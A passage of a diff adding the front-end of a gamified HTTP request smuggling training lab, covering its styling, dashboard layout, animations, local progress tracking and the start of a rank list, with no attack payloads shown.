@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GHOST PROTOCOL // HTTP SMUGGLING OPS</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link href="assets/auth.css" rel="stylesheet">
+<style>
+:root{
+  --bg:#020804;--bg2:#040d06;--bg3:#061008;
+  --green:#00ff41;--green2:#00cc33;--green3:#008822;
+  --cyan:#00f5ff;--red:#ff073a;--yellow:#ffd700;
+  --orange:#ff6b00;--purple:#bf5fff;--pink:#ff2d78;
+  --dim:rgba(0,255,65,0.08);--border:rgba(0,255,65,0.15);
+  --glow:0 0 20px rgba(0,255,65,0.4);
+  --glow-c:0 0 20px rgba(0,245,255,0.4);
+  --glow-r:0 0 20px rgba(255,7,58,0.4);
+  --glow-y:0 0 20px rgba(255,215,0,0.4);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);color:var(--green);
+  font-family:'JetBrains Mono',monospace;
+  min-height:100vh;overflow-x:hidden;
+  cursor:crosshair;
+}
+canvas#rain{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:.06;pointer-events:none;}
+.scanlines{position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.008) 2px,rgba(0,255,65,.008) 4px);pointer-events:none;z-index:9997;}
+.vignette{position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,.7) 100%);pointer-events:none;z-index:9996;}
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--green3);}
+
+/* TOP PROGRESS */
+#ptop{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--green),var(--cyan),var(--green));z-index:10000;transition:width .1s;box-shadow:0 0 8px var(--green);}
+
+/* BOOT SCREEN */
+#boot{position:fixed;inset:0;background:var(--bg);z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;}
+#boot h1{font-family:'Orbitron',monospace;font-size:clamp(18px,4vw,42px);letter-spacing:8px;color:var(--green);text-shadow:var(--glow);animation:flicker 3s infinite;}
+@keyframes flicker{0%,98%,100%{opacity:1}99%{opacity:.3}}
+#boot-log{font-size:11px;color:var(--green3);letter-spacing:2px;text-align:center;line-height:2;max-width:500px;}
+#boot-bar-wrap{width:300px;height:3px;background:rgba(0,255,65,.1);margin-top:16px;}
+#boot-bar{height:100%;background:var(--green);width:0;transition:width .05s;box-shadow:0 0 8px var(--green);}
+
+/* MAIN APP */
+#app{position:relative;z-index:1;max-width:1300px;margin:0 auto;padding:12px 16px;opacity:0;transition:opacity .5s;}
+#app.visible{opacity:1;}
+
+/* ══ HEADER ══ */
+.hdr{
+  border:1px solid var(--border);border-top:3px solid var(--green);
+  background:linear-gradient(180deg,rgba(0,255,65,.05) 0%,transparent 100%);
+  padding:20px 24px;margin-bottom:16px;position:relative;
+  box-shadow:var(--glow),inset 0 0 40px rgba(0,255,65,.02);
+}
+.hdr-top{display:flex;align-items:center;gap:16px;margin-bottom:12px;flex-wrap:wrap;}
+.hdr-logo{font-family:'Orbitron',monospace;font-size:clamp(16px,3vw,32px);font-weight:900;letter-spacing:4px;background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 4s infinite;background-size:200%;}
+@keyframes shimmer{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+.hdr-sub{font-size:10px;letter-spacing:5px;color:rgba(0,255,65,.4);text-transform:uppercase;}
+.hdr-classify{margin-left:auto;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:3px;border:1px solid var(--red);color:var(--red);padding:4px 10px;animation:pulse-red 2s infinite;}
+@keyframes pulse-red{0%,100%{box-shadow:none}50%{box-shadow:0 0 10px var(--red)}}
+
+/* STATS ROW */
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin-bottom:12px;}
+.stat-card{
+  background:rgba(0,255,65,.04);border:1px solid var(--border);
+  padding:10px 14px;position:relative;overflow:hidden;
+  transition:all .3s;
+}
+.stat-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--green);}
+.stat-card:nth-child(2)::before{background:var(--cyan);}
+.stat-card:nth-child(3)::before{background:var(--yellow);}
+.stat-card:nth-child(4)::before{background:var(--orange);}
+.stat-card:nth-child(5)::before{background:var(--purple);}
+.stat-label{font-size:9px;letter-spacing:3px;color:rgba(0,255,65,.4);margin-bottom:4px;}
+.stat-value{font-family:'Orbitron',monospace;font-size:16px;font-weight:900;}
+.stat-card:nth-child(1) .stat-value{color:var(--green);}
+.stat-card:nth-child(2) .stat-value{color:var(--cyan);}
+.stat-card:nth-child(3) .stat-value{color:var(--yellow);}
+.stat-card:nth-child(4) .stat-value{color:var(--orange);}
+.stat-card:nth-child(5) .stat-value{color:var(--purple);}
+
+/* XP BAR */
+.xp-wrap{background:rgba(0,255,65,.06);height:4px;position:relative;overflow:hidden;margin-bottom:4px;}
+.xp-fill{height:100%;background:linear-gradient(to right,var(--green),var(--cyan));transition:width .6s ease;box-shadow:0 0 6px var(--cyan);}
+.xp-meta{display:flex;justify-content:space-between;font-size:9px;color:rgba(0,255,65,.3);letter-spacing:2px;}
+
+/* STREAK */
+.streak-row{display:flex;gap:6px;align-items:center;margin-top:8px;}
+.streak-day{width:24px;height:24px;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;transition:all .3s;}
+.streak-day.done{background:rgba(0,255,65,.15);border-color:var(--green);color:var(--green);}
+.streak-day.today{border-color:var(--yellow);animation:pulse-y 1.5s infinite;}
+@keyframes pulse-y{0%,100%{box-shadow:none}50%{box-shadow:0 0 8px var(--yellow)}}
+
+/* ══ TABS ══ */
+.tabs{display:flex;gap:3px;margin-bottom:16px;overflow-x:auto;padding-bottom:2px;border-bottom:1px solid var(--border);}
+.tab{
+  font-family:'Orbitron',monospace;font-size:9px;letter-spacing:2px;
+  padding:8px 16px;border:1px solid transparent;background:transparent;
+  color:rgba(0,255,65,.4);cursor:pointer;white-space:nowrap;
+  transition:all .2s;flex-shrink:0;position:relative;
+}
+.tab:hover{color:var(--green);border-color:var(--border);}
+.tab.active{color:var(--green);border:1px solid var(--green);background:var(--dim);box-shadow:var(--glow);}
+.tab .tbadge{background:var(--red);color:#000;font-size:8px;padding:1px 4px;margin-left:4px;border-radius:2px;font-weight:900;}
+
+/* ══ PANELS ══ */
+.panel{display:none;animation:fadeIn .3s ease;}
+.panel.active{display:block;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ══ MISSION SELECT ══ */
+.ops-header{
+  font-family:'Orbitron',monospace;font-size:11px;letter-spacing:4px;
+  color:rgba(0,255,65,.5);margin-bottom:12px;
+  display:flex;align-items:center;gap:10px;
+}
+.ops-header::after{content:'';flex:1;height:1px;background:var(--border);}
+
+.mission-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px;margin-bottom:20px;}
+.mission-card{
+  background:var(--bg2);border:1px solid var(--border);
+  padding:16px;cursor:pointer;position:relative;overflow:hidden;
+  transition:all .25s;
+}
+.mission-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:transparent;transition:background .3s;}
+.mission-card:hover::before{background:var(--green);box-shadow:0 0 8px var(--green);}
+.mission-card:hover{border-color:var(--green);transform:translateY(-2px);box-shadow:var(--glow);}
+.mission-card.solved{background:rgba(0,255,65,.04);}
+.mission-card.solved::before{background:var(--green);}
+.mc-top{display:flex;align-items:flex-start;gap:10px;margin-bottom:8px;}
+.mc-icon{font-size:28px;flex-shrink:0;}
+.mc-info{}
+.mc-num{font-size:9px;color:rgba(0,255,65,.3);letter-spacing:3px;margin-bottom:2px;}
+.mc-title{font-family:'Orbitron',monospace;font-size:10px;color:var(--green);letter-spacing:1px;line-height:1.3;}
+.mc-diff{font-size:9px;letter-spacing:2px;padding:2px 6px;border:1px solid;display:inline-block;margin:6px 0;}
+.mc-diff.practitioner{border-color:var(--orange);color:var(--orange);}
+.mc-diff.expert{border-color:var(--red);color:var(--red);}
+.mc-obj{font-family:'Rajdhani',sans-serif;font-size:12px;color:rgba(0,255,65,.5);line-height:1.4;}
+.mc-footer{display:flex;justify-content:space-between;align-items:center;margin-top:10px;padding-top:8px;border-top:1px solid var(--border);}
+.mc-xp{font-size:10px;color:var(--yellow);}
+.mc-status{font-size:10px;}
+.mc-status.done{color:var(--green);}
+.mc-status.open{color:rgba(0,255,65,.3);}
+
+/* ══ LAB PANEL ══ */
+.lab-wrap{max-width:100%;}
+
+.lab-banner{
+  background:linear-gradient(135deg,rgba(0,255,65,.05),rgba(0,245,255,.03));
+  border:1px solid var(--border);border-left:4px solid var(--green);
+  padding:18px 20px;margin-bottom:12px;position:relative;
+}
+.lab-banner.expert-banner{border-left-color:var(--red);}
+.lab-num{font-size:9px;color:rgba(0,255,65,.3);letter-spacing:4px;margin-bottom:4px;}
+.lab-title{font-family:'Orbitron',monospace;font-size:clamp(12px,2.5vw,18px);color:var(--cyan);letter-spacing:2px;margin-bottom:6px;}
+.lab-badges{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px;}
+.badge{font-size:9px;letter-spacing:2px;padding:3px 8px;border:1px solid;}
+.badge-p{border-color:var(--orange);color:var(--orange);}
+.badge-e{border-color:var(--red);color:var(--red);animation:pulse-red 2s infinite;}
+.badge-xp{border-color:var(--yellow);color:var(--yellow);}
+.lab-obj{font-family:'Rajdhani',sans-serif;font-size:15px;color:#b0ffb0;line-height:1.6;}
+
+/* BRAIN HACK */
+.brain-hack{
+  background:rgba(0,245,255,.04);border:1px solid rgba(0,245,255,.2);
+  border-left:4px solid var(--cyan);padding:14px 18px;margin-bottom:12px;
+  font-family:'Rajdhani',sans-serif;font-size:15px;color:#99ddee;line-height:1.6;
+}
+.brain-hack strong{color:var(--cyan);}
+
+/* ATTACK VIZ */
+.viz{
+  background:var(--bg3);border:1px solid var(--border);
+  padding:16px;margin-bottom:12px;
+}
+.viz-title{font-size:9px;letter-spacing:4px;color:rgba(0,255,65,.3);margin-bottom:14px;}
+.viz-flow{display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;}
+.vnode{border:1px solid;padding:10px 12px;text-align:center;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:1px;min-width:80px;transition:all .3s;}
+.vnode.att{border-color:var(--red);color:var(--red);}
+.vnode.frt{border-color:var(--yellow);color:var(--yellow);}
+.vnode.bck{border-color:var(--orange);color:var(--orange);}
+.vnode.vic{border-color:var(--cyan);color:var(--cyan);}
+.vnode.cch{border-color:var(--purple);color:var(--purple);}
+.vnode .vi{font-size:20px;display:block;margin-bottom:4px;}
+.vnode small{font-size:8px;opacity:.7;display:block;margin-top:2px;}
+.varr{color:rgba(0,255,65,.3);font-size:18px;flex-shrink:0;}
+.varr.danger{color:var(--red);text-shadow:0 0 6px var(--red);}
+
+/* STEP GUIDE */
+.steps-wrap{background:var(--bg2);border:1px solid rgba(0,245,255,.15);margin-bottom:12px;}
+.steps-hdr{
+  padding:10px 16px;font-family:'Orbitron',monospace;font-size:9px;
+  letter-spacing:3px;color:var(--cyan);cursor:pointer;
+  display:flex;justify-content:space-between;align-items:center;
+  background:rgba(0,245,255,.04);border-bottom:1px solid rgba(0,245,255,.1);
+  user-select:none;
+}
+.steps-body{display:none;padding:4px 0;}
+.steps-body.open{display:block;}
+.step-item{display:flex;gap:12px;padding:12px 16px;border-bottom:1px solid rgba(0,255,65,.05);}
+.step-item:last-child{border-bottom:none;}
+.snum{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;color:var(--yellow);min-width:24px;flex-shrink:0;}
+.scontent{}
+.stitle{font-size:12px;font-weight:700;color:var(--cyan);letter-spacing:1px;margin-bottom:4px;}
+.sdesc{font-family:'Rajdhani',sans-serif;font-size:14px;color:#88bb88;line-height:1.5;}
+.scode{
+  background:rgba(0,0,0,.6);border:1px solid rgba(0,255,65,.12);
+  padding:10px 12px;margin-top:8px;font-size:11px;color:var(--yellow);
+  line-height:1.8;overflow-x:auto;white-space:pre;font-family:'Share Tech Mono',monospace;
+}
+.snote{margin-top:6px;padding:8px 12px;background:rgba(255,215,0,.04);border-left:3px solid var(--yellow);font-family:'Rajdhani',sans-serif;font-size:13px;color:#ccbb66;line-height:1.5;}
+
+/* EDITOR AREA */
+.editor-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;}
+@media(max-width:768px){.editor-grid{grid-template-columns:1fr;}}
+.ebox{background:var(--bg2);border:1px solid var(--border);overflow:hidden;}
+.ebox-hdr{
+  background:rgba(0,0,0,.4);border-bottom:1px solid var(--border);
+  padding:7px 12px;font-size:9px;letter-spacing:3px;
+  display:flex;align-items:center;gap:8px;
+}
+.dot-r{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 4px var(--red);}
+.dot-g{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 4px var(--green);}
+.dot-y{width:7px;height:7px;border-radius:50%;background:var(--yellow);}
+.req-ta{
+  width:100%;background:transparent;border:none;outline:none;
+  color:#ccffcc;font-family:'Share Tech Mono',monospace;font-size:12px;
+  line-height:1.75;padding:12px;resize:vertical;min-height:220px;
+  caret-color:var(--green);
+}
+.req-ta::selection{background:rgba(0,255,65,.2);}
+.resp-area{
+  padding:12px;font-size:11px;line-height:1.75;min-height:220px;
+  color:#667766;font-family:'Share Tech Mono',monospace;
+  white-space:pre-wrap;word-break:break-all;overflow-y:auto;max-height:400px;
+}
+.r200{color:var(--green);}
+.r301{color:var(--yellow);}
+.r400,.r403,.r404{color:var(--red);}
+.rwin{background:rgba(0,255,65,.08);color:var(--green);border-left:3px solid var(--green);padding-left:8px;display:block;margin:2px 0;}
+.rwarn{color:var(--yellow);}
+
+/* CONTROLS */
+.ctrl{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;align-items:center;}
+.btn{
+  font-family:'Orbitron',monospace;font-size:9px;letter-spacing:2px;
+  padding:9px 18px;border:1px solid currentColor;background:transparent;
+  cursor:pointer;transition:all .2s;position:relative;overflow:hidden;white-space:nowrap;
+}
+.btn::before{content:'';position:absolute;inset:0;background:currentColor;opacity:0;transition:opacity .2s;}
+.btn:hover::before{opacity:.1;}
+.btn-g{color:var(--green);}
+.btn-g:hover{box-shadow:var(--glow);}
+.btn-c{color:var(--cyan);}
+.btn-c:hover{box-shadow:var(--glow-c);}
+.btn-r{color:var(--red);}
+.btn-r:hover{box-shadow:var(--glow-r);}
+.btn-y{color:var(--yellow);}
+.btn-y:hover{box-shadow:var(--glow-y);}
+.btn-p{color:var(--purple);}
+.kb{font-size:9px;color:rgba(0,255,65,.25);margin-left:auto;letter-spacing:1px;}
+kbd{border:1px solid rgba(0,255,65,.2);padding:1px 4px;font-size:9px;}
+
+/* HINT */
+.hint-box{background:rgba(191,95,255,.05);border:1px solid rgba(191,95,255,.2);border-left:3px solid var(--purple);padding:12px 16px;margin-bottom:10px;display:none;}
+.hint-box.show{display:block;}
+.hint-box p{font-family:'Rajdhani',sans-serif;font-size:14px;color:#cc99ff;line-height:1.6;}
+
+/* SOLUTION */
+.sol-box{background:rgba(0,0,0,.6);border:1px solid rgba(255,7,58,.2);padding:16px;display:none;margin-bottom:10px;}
+.sol-box.show{display:block;}
+.sol-box pre{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--yellow);line-height:1.8;overflow-x:auto;white-space:pre-wrap;word-break:break-word;}
+
+/* NOTES */
+.notes-ta{
+  width:100%;background:rgba(0,255,65,.02);border:1px solid var(--border);
+  color:#88aa88;font-family:'JetBrains Mono',monospace;font-size:12px;
+  padding:10px;min-height:80px;outline:none;resize:vertical;margin-bottom:10px;
+}
+
+/* TIMER */
+.timer-row{display:flex;align-items:center;gap:12px;margin-bottom:10px;font-size:11px;color:rgba(0,255,65,.4);letter-spacing:2px;}
+.timer-val{font-family:'Orbitron',monospace;font-size:16px;color:var(--green);}
+.timer-val.warn{color:var(--yellow);}
+
+/* TOAST */
+.toast{
+  position:fixed;bottom:20px;right:20px;z-index:99998;
+  padding:14px 20px;border:1px solid;font-family:'Orbitron',monospace;
+  font-size:10px;letter-spacing:2px;max-width:320px;line-height:1.5;
+  transform:translateY(80px);opacity:0;transition:all .35s ease;
+}
+.toast.show{transform:translateY(0);opacity:1;}
+.toast.ok{border-color:var(--green);background:rgba(0,255,65,.08);color:var(--green);box-shadow:var(--glow);}
+.toast.err{border-color:var(--red);background:rgba(255,7,58,.08);color:var(--red);box-shadow:var(--glow-r);}
+.toast.inf{border-color:var(--cyan);background:rgba(0,245,255,.08);color:var(--cyan);box-shadow:var(--glow-c);}
+.toast.warn{border-color:var(--yellow);background:rgba(255,215,0,.06);color:var(--yellow);box-shadow:var(--glow-y);}
+
+/* SCORE POPUP */
+.spop{
+  position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);
+  z-index:99999;background:var(--bg2);
+  border:2px solid var(--green);padding:40px 60px;text-align:center;
+  box-shadow:var(--glow),0 0 80px rgba(0,255,65,.15);
+  transition:transform .4s cubic-bezier(.34,1.56,.64,1);min-width:300px;
+}
+.spop.show{transform:translate(-50%,-50%) scale(1);}
+.spop h2{font-family:'Orbitron',monospace;font-size:14px;letter-spacing:4px;color:var(--cyan);margin-bottom:8px;}
+.spop-pts{font-family:'Orbitron',monospace;font-size:52px;font-weight:900;color:var(--yellow);text-shadow:0 0 30px var(--yellow);margin:8px 0;}
+.spop-rank{font-size:11px;letter-spacing:3px;color:var(--green);margin-bottom:16px;}
+.spop p{font-family:'Rajdhani',sans-serif;font-size:15px;color:#aaffaa;}
+
+/* CONFETTI */
+.confetti-piece{position:fixed;width:8px;height:8px;opacity:0;pointer-events:none;z-index:100000;animation:conffall 2s ease-in forwards;}
+@keyframes conffall{0%{opacity:1;transform:translateY(-20px) rotate(0deg);}100%{opacity:0;transform:translateY(100vh) rotate(720deg);}}
+
+/* GLOSSARY */
+.glos-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;}
+.gcard{background:var(--bg2);border:1px solid var(--border);padding:14px;cursor:pointer;transition:all .2s;}
+.gcard:hover{border-color:var(--green);}
+.gterm{font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;margin-bottom:6px;}
+.gdef{font-family:'Rajdhani',sans-serif;font-size:13px;color:#889988;line-height:1.5;display:none;}
+.gdef.open{display:block;}
+
+/* RANK BOARD */
+.rank-list{display:flex;flex-direction:column;gap:6px;max-width:500px;}
+.rank-item{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);}
+.rank-item.current{border-color:var(--green);box-shadow:var(--glow);}
+.rank-icon{font-size:20px;}
+.rank-name{font-family:'Orbitron',monospace;font-size:11px;letter-spacing:2px;color:var(--green);}
+.rank-xp{font-size:10px;color:rgba(0,255,65,.4);margin-left:auto;}
+
+/* SOLVED BANNER */
+.solved-banner{padding:12px 16px;background:rgba(0,255,65,.06);border:1px solid var(--green);font-family:'Orbitron',monospace;font-size:10px;letter-spacing:3px;color:var(--green);text-align:center;margin-top:10px;}
+
+/* MOBILE */
+@media(max-width:500px){
+  .ctrl{flex-direction:column;align-items:stretch;}
+  .btn{text-align:center;}
+  .stats-row{grid-template-columns:1fr 1fr;}
+  .spop{padding:24px 20px;min-width:260px;}
+  .spop-pts{font-size:36px;}
+}
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+<div id="ptop"></div>
+<canvas id="rain"></canvas>
+
+<!-- BOOT SCREEN -->
+<div id="boot">
+  <div style="font-size:11px;color:var(--green3);letter-spacing:4px;margin-bottom:16px;">// GHOST PROTOCOL SYSTEMS //</div>
+  <h1>INITIALIZING...</h1>
+  <div id="boot-log"></div>
+  <div class="boot-bar-wrap" style="width:300px;height:2px;background:rgba(0,255,65,.1);margin-top:20px;">
+    <div id="boot-bar" style="height:100%;background:var(--green);width:0;transition:width .05s;box-shadow:0 0 8px var(--green);"></div>
+  </div>
+</div>
+
+<!-- MAIN APP -->
+<div id="app">
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="hdr-top">
+    <div>
+      <div class="hdr-logo">👻 GHOST PROTOCOL</div>
+      <div class="hdr-sub">// HTTP SMUGGLING OPERATIONS CENTER // CLEARANCE: TOP SECRET //</div>
+    </div>
+    <div class="hdr-classify">⚠ CLASSIFIED</div>
+  </div>
+  <div class="stats-row">
+    <div class="stat-card"><div class="stat-label">MISSIONS COMPLETE</div><div class="stat-value"><span id="s-solved">0</span>/22</div></div>
+    <div class="stat-card"><div class="stat-label">TOTAL XP</div><div class="stat-value"><span id="s-xp">0</span></div></div>
+    <div class="stat-card"><div class="stat-label">OPERATIVE RANK</div><div class="stat-value" id="s-rank" style="font-size:11px;">RECRUIT</div></div>
+    <div class="stat-card"><div class="stat-label">STREAK</div><div class="stat-value"><span id="s-streak">0</span>🔥</div></div>
+    <div class="stat-card"><div class="stat-label">BEST TIME</div><div class="stat-value" id="s-best">--:--</div></div>
+  </div>
+  <div class="xp-wrap"><div class="xp-fill" id="xp-fill" style="width:0%"></div></div>
+  <div class="xp-meta"><span id="xp-cur">0 XP</span><span id="xp-next">Next rank: 300 XP</span></div>
+  <div class="streak-row" id="streak-row" style="margin-top:10px;"></div>
+</div>
+
+<!-- TABS -->
+<div class="tabs">
+  <button class="tab active" onclick="showP('dash')">⊞ OPS CENTER</button>
+  <button class="tab" id="tab-lab" onclick="showP('lab')">⚡ ACTIVE MISSION</button>
+  <button class="tab" onclick="showP('ranks')">🏆 RANKS</button>
+  <button class="tab" onclick="showP('glos')">📖 INTEL CODEX</button>
+</div>
+
+<!-- DASHBOARD -->
+<div class="panel active" id="panel-dash">
+  <div class="ops-header">// PRACTITIONER TIER — CORE TECHNIQUES</div>
+  <div class="mission-grid" id="grid-p"></div>
+  <div class="ops-header">// EXPERT TIER — ADVANCED OPERATIONS</div>
+  <div class="mission-grid" id="grid-e"></div>
+</div>
+
+<!-- LAB PANEL -->
+<div class="panel" id="panel-lab">
+  <div id="lab-content"></div>
+</div>
+
+<!-- RANKS PANEL -->
+<div class="panel" id="panel-ranks">
+  <div class="ops-header">// OPERATIVE RANKS</div>
+  <div class="rank-list" id="rank-list"></div>
+</div>
+
+<!-- GLOSSARY PANEL -->
+<div class="panel" id="panel-glos">
+  <div class="ops-header">// INTEL CODEX — CLICK TO EXPAND</div>
+  <div class="glos-grid" id="glos-grid"></div>
+</div>
+
+</div><!-- /app -->
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- SCORE POPUP -->
+<div class="spop" id="spop">
+  <h2>// MISSION COMPLETE //</h2>
+  <div class="spop-pts" id="spop-pts">+500</div>
+  <div class="spop-rank" id="spop-rank"></div>
+  <p id="spop-msg"></p>
+  <button class="btn btn-g" style="margin-top:20px;" onclick="closeSPop()">NEXT MISSION ▶</button>
+</div>
+
+<script>
+// ═══════════════════════════════════════════
+// MATRIX RAIN
+// ═══════════════════════════════════════════
+const rainCanvas=document.getElementById('rain');
+const rCtx=rainCanvas.getContext('2d');
+function resizeRain(){rainCanvas.width=innerWidth;rainCanvas.height=innerHeight;}
+resizeRain();addEventListener('resize',resizeRain);
+const rChars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*GETPOSTHTTP\r\nContent-LengthTransfer-EncodingChunkedSMUGGLEDGHOST'.split('');
+const rFs=13;
+let rDrops=[];
+function initDrops(){rDrops=Array(Math.floor(innerWidth/rFs)).fill(0).map(()=>Math.random()*-100);}
+initDrops();addEventListener('resize',initDrops);
+function drawRain(){
+  rCtx.fillStyle='rgba(2,8,4,0.05)';rCtx.fillRect(0,0,rainCanvas.width,rainCanvas.height);
+  rCtx.fillStyle='#00ff41';rCtx.font=rFs+'px Share Tech Mono';
+  rDrops.forEach((y,i)=>{
+    rCtx.fillText(rChars[Math.floor(Math.random()*rChars.length)],i*rFs,y*rFs);
+    if(y*rFs>rainCanvas.height&&Math.random()>.975)rDrops[i]=0;
+    rDrops[i]++;
+  });
+}
+setInterval(drawRain,45);
+
+// ═══════════════════════════════════════════
+// BOOT SEQUENCE
+// ═══════════════════════════════════════════
+const bootMsgs=[
+  'INITIALIZING GHOST PROTOCOL v4.2.1...',
+  'LOADING HTTP DESYNC ENGINE...',
+  'MOUNTING LAB ENVIRONMENT...',
+  'LOADING MISSION DATABASE...',
+  'DECRYPTING MISSION BRIEFS...',
+  'AUTHENTICATING OPERATOR...',
+  'LOADING INTELLIGENCE CACHE...',
+  'CALIBRATING SIMULATION ENGINE...',
+  'SYNCHRONIZING TRAINING MODULES...',
+  'VERIFYING SECURE COMMUNICATIONS...',
+  'MISSION READY.',
+];
+let bootIdx=0,bootPct=0;
+const bootLog=document.getElementById('boot-log');
+const bootBar=document.getElementById('boot-bar');
+window.finishGhostStartup=function(showApp){
+  document.getElementById('boot').style.opacity='0';
+  document.getElementById('boot').style.transition='opacity .5s';
+  setTimeout(()=>{
+    document.getElementById('boot').style.display='none';
+    if(showApp)document.getElementById('app').classList.add('visible');
+  },500);
+};
+window.startGhostProtocol=()=>window.finishGhostStartup(true);
+function bootStep(){
+  if(bootIdx>=bootMsgs.length){
+    setTimeout(async()=>{
+      window.ghostSplashComplete=true;
+      const authenticated=await window.ghostAuthReady;
+      window.finishGhostStartup(authenticated);
+    },1000);
+    return;
+  }
+  bootLog.innerHTML+=bootMsgs[bootIdx]+'<br>';
+  bootPct=Math.round(((bootIdx+1)/bootMsgs.length)*100);
+  bootBar.style.width=bootPct+'%';
+  bootIdx++;
+  setTimeout(bootStep,180+Math.random()*140);
+}
+setTimeout(bootStep,450);
+
+// ═══════════════════════════════════════════
+// SCROLL PROGRESS
+// ═══════════════════════════════════════════
+addEventListener('scroll',()=>{
+  const pct=(scrollY/(document.documentElement.scrollHeight-innerHeight))*100;
+  document.getElementById('ptop').style.width=pct+'%';
+});
+
+// ═══════════════════════════════════════════
+// STATE & PERSISTENCE
+// ═══════════════════════════════════════════
+function loadState(){
+  try{
+    const s=JSON.parse(localStorage.getItem('ghost_protocol')||'{}');
+    return{
+      xp:s.xp||0,
+      solved:new Set(s.solved||[]),
+      streak:s.streak||0,
+      lastDay:s.lastDay||null,
+      bestTimes:s.bestTimes||{},
+      notes:s.notes||{},
+      quizScores:s.quizScores||{},
+      achievements:s.achievements||[],
+      unlocks:s.unlocks||[],
+      preferences:s.preferences||{},
+      settings:s.settings||{},
+    };
+  }catch(e){return{xp:0,solved:new Set(),streak:0,lastDay:null,bestTimes:{},notes:{},quizScores:{},achievements:[],unlocks:[],preferences:{},settings:{}};}
+}
+function saveState(){
+  const snapshot={
+    xp:ST.xp,
+    solved:[...ST.solved],
+    streak:ST.streak,
+    lastDay:ST.lastDay,
+    bestTimes:ST.bestTimes,
+    notes:ST.notes,
+    quizScores:ST.quizScores,
+    achievements:ST.achievements,
+    unlocks:ST.unlocks,
+    preferences:ST.preferences,
+    settings:ST.settings,
+  };
+  localStorage.setItem('ghost_protocol',JSON.stringify(snapshot));
+  window.dispatchEvent(new CustomEvent('ghost-progress-changed',{detail:snapshot}));
+}
+const ST=loadState();
+window.GhostProgress=Object.freeze({
+  snapshot:()=>({
+    xp:ST.xp,
+    solved:[...ST.solved],
+    streak:ST.streak,
+    lastDay:ST.lastDay,
+    bestTimes:ST.bestTimes,
+    notes:ST.notes,
+    quizScores:ST.quizScores,
+    achievements:ST.achievements,
+    unlocks:ST.unlocks,
+    preferences:ST.preferences,
+    settings:ST.settings,
+  }),
+  hydrate:(state={})=>{
+    ST.xp=Number(state.xp)||0;
+    ST.solved=new Set(Array.isArray(state.solved)?state.solved:[]);
+    ST.streak=Number(state.streak)||0;
+    ST.lastDay=state.lastDay||null;
+    ST.bestTimes=state.bestTimes&&typeof state.bestTimes==='object'?state.bestTimes:{};
+    ST.notes=state.notes&&typeof state.notes==='object'?state.notes:{};
+    ST.quizScores=state.quizScores&&typeof state.quizScores==='object'?state.quizScores:{};
+    ST.achievements=Array.isArray(state.achievements)?state.achievements:[];
+    ST.unlocks=Array.isArray(state.unlocks)?state.unlocks:[];
+    ST.preferences=state.preferences&&typeof state.preferences==='object'?state.preferences:{};
+    ST.settings=state.settings&&typeof state.settings==='object'?state.settings:{};
+    localStorage.setItem('ghost_protocol',JSON.stringify(window.GhostProgress.snapshot()));
+    if(typeof buildDash==='function')buildDash();
+    if(typeof buildRanks==='function')buildRanks();
+    if(typeof updateUI==='function')updateUI();
+  }
+});
+
+// Check streak
+(function(){
+  const today=new Date().toDateString();
+  if(ST.lastDay){
+    const last=new Date(ST.lastDay);
+    const diff=Math.floor((new Date()-last)/(1000*60*60*24));
+    if(diff===0){}
+    else if(diff===1){ST.streak++;}
+    else{ST.streak=1;}
+  } else {ST.streak=1;}
+  ST.lastDay=today;
+  saveState();
+})();
+
+// ═══════════════════════════════════════════
+// RANKS
+// ═══════════════════════════════════════════
+const RANKS=[
+  {name:'CIVILIAN',xp:0,icon:'👤',msg:'You haven\'t started yet.'},
+  {name:'RECRUIT',xp:100,icon:'🔰',msg:'Learning the basics.'},
+  {name:'SCRIPT KIDDIE',xp:300,icon:'💻',msg:'You\'ve got the tools, now learn to use them.'},
